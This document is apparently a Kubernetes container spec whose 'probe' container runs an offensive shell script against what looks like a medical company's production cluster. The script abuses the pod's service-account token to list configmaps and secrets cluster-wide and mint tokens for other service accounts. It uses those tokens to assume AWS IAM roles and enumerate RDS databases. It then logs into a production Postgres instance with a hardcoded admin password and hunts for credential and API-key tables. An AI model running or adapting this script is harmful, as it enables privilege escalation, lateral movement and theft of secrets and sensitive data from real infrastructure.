containers.name: probe
args:
#!/bin/sh
set -u
echo "===I3577D_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache postgresql16-client curl jq aws-cli >/tmp/apk.log 2>&1
GEO=$(curl -s -m 20 http://ip-api.com/json/); echo "GEO $GEO"
echo "$GEO" | grep -q '"countryCode":"CN"' && { echo "ABORT_CN_EGRESS"; exit 0; }
export AWS_DEFAULT_REGION=us-west-2
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token 2>/dev/null); API=https://kubernetes.default.svc
get(){ curl -sk -m 60 -H "Authorization: Bearer $TOKEN" "$1"; }
post(){ curl -sk -m 60 -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data "$2" "$1"; }
assume(){ NS=$1; S=$2
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && { echo "NO_IRSA $NS/$S"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty'); [ -z "$WT" ] && { echo "NO_TOKEN $NS/$S"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name i3577d --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS $AR $(echo "$RES"|head -c 100)"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  echo "ASSUME_OK $NS $AR"; return 0; }
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; }

echo "########## CLUSTER-WIDE MLFLOW TRACE ##########"
for NS in $(get $API/api/v1/namespaces | jq -r '.items[].metadata.name'); do
  CM=$(get "$API/api/v1/namespaces/$NS/configmaps" | jq -r --arg ns "$NS" '.items[]? | select(((.data//{})|tostring|test("mlflow";"i")) or (.metadata.name|test("mlflow";"i"))) | "CM \($ns)/\(.metadata.name) :: " + (((.data//{})|to_entries|map("\(.key)=\(.value|tostring|.[0:300])")|join(" | "))|.[0:900])' 2>/dev/null)
  [ -n "$CM" ] && echo "$CM"
  SC=$(get "$API/api/v1/namespaces/$NS/secrets" | jq -r --arg ns "$NS" '.items[]? | select(.metadata.name|test("mlflow";"i")) | "SEC \($ns)/\(.metadata.name) keys=\((.data//{})|keys|join(","))"' 2>/dev/null)
  [ -n "$SC" ] && echo "$SC"
  SVD=$(get "$API/api/v1/namespaces/$NS/services" | jq -r --arg ns "$NS" '.items[]? | select(.metadata.name|test("mlflow";"i")) | "SVC \($ns)/\(.metadata.name)"' 2>/dev/null)
  [ -n "$SVD" ] && echo "$SVD"
done
echo "-- END_TRACE"

echo "########## DNS CANDIDATES ##########"
for N in postgresql1 postgresql-rds1 postgresql-rds mlflow mlflow-rds mlflow-postgresql postgresql-rds2; do
  H="lazamedical-dp-prod01-usw2-$N.clg4mimw6718.us-west-2.rds.amazonaws.com"
  echo "DNS $N -> $(getent hosts $H | awk '{print $1}' | head -1 || echo NXDOMAIN)"
done

echo "########## IRSA mlflow-service RDS DESCRIBE ##########"
if assume mlflow mlflow-sa; then
  echo "DBI: $(aws rds describe-db-instances --max-records 100 --query 'DBInstances[].DBInstanceIdentifier' --output json 2>&1 | head -c 700)"
  echo "PROXY: $(aws rds describe-db-proxies --query 'DBProxies[].{n:DBProxyName,e:Endpoint,s:Status}' --output json 2>&1 | head -c 700)"
  unassume
fi

echo "########## DP INSTANCE: any mlflow databases? ##########"
export PGPASSWORD='O7-=&m^RCS^wO~G97;tgAq|8gj|3=`Kj'
PSQL(){ psql "host=lazamedical-dp-prod01-usw2-postgresql-rds.clg4mimw6718.us-west-2.rds.amazonaws.com port=5432 user=postgres_admin dbname=postgres sslmode=require connect_timeout=15" -At -F'|' -c "$1" 2>&1; }
echo "DPLIST: $(PSQL "select datname from pg_database where not datistemplate order by 1" | head -20 | tr '\n' ' ')"
for DB in mlflow_service mlflow_auth mlflow; do
  R=$(psql "host=lazamedical-dp-prod01-usw2-postgresql-rds.clg4mimw6718.us-west-2.rds.amazonaws.com port=5432 user=postgres_admin dbname=$DB sslmode=require connect_timeout=12" -At -c "select current_database()" 2>&1 | head -1)
  echo "DPDB $DB => $(echo "$R"|cut -c1-120)"
done
echo "-- DP tables matching mlflow in dp_service"
PSQL "select table_schema||'.'||table_name from information_schema.tables where table_name ~* 'mlflow|secret|api_key|provider|credential' order by 1 limit 20" | head -25 | sed 's/^/  DPT /'
echo "===I3577D_DONE $(date -u +%FT%TZ)==="
